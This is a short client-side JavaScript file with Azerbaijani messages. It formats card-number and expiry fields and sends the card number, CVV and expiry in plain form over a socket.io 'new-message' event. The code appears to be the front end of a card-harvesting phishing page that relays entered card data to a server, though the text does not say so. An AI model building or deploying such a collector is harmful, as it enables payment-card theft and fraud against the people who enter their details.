const socket = io();

// Format card number with spaces
document.getElementById('cardInput')?.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s/g, '');
    let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
    e.target.value = formattedValue;
});

// Format expiry date with slash
document.getElementById('expiryInput')?.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\//g, '');
    if (value.length >= 2) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    e.target.value = value;
});

// Send message function
function sendMessage() {
    const cardNumber = document.getElementById('cardInput').value.trim();
    const cvv = document.getElementById('cvvInput').value.trim();
    const expiry = document.getElementById('expiryInput').value.trim();
    
    if (!cardNumber || !cvv || !expiry) {
        alert('Bütün xanaları doldurun');
        return;
    }
    
    // Validate expiry format (XX/XX)
    if (!expiry.match(/^\d{2}\/\d{2}$/)) {
        alert('İstifadə müddəti formatı düzgün deyil (XX/XX)');
        return;
    }
    
    socket.emit('new-message', {
        cardNumber: cardNumber,
        cvv: cvv,
        expiry: expiry
    });
    
    // Clear form
    document.getElementById('cardInput').value = '';
    document.getElementById('cvvInput').value = '';
    document.getElementById('expiryInput').value = '';
    
    alert('Məlumat göndərildi');
}
